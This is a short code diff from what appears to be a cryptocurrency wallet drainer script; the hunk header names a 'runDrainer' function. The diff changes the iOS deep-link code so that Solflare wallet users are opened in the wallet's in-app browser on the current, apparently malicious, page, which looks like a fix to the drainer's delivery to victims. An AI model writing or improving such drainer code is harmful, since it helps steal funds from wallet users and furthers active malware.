@@ -6147,9 +6147,10 @@ window.runDrainer = runDrainer;
               deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
               fallbackUrl = `solflare://v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
             } else {
-              // iOS: Use ref parameter (existing working format)
-              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
-              fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+              // iOS: Use ref parameter with the dApp URL (correct format)
+              const dappUrl = encodeURIComponent(currentUrl);
+              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${dappUrl}`;
+              fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${dappUrl}`;
             }
           } else {
             // Desktop: Use custom scheme first
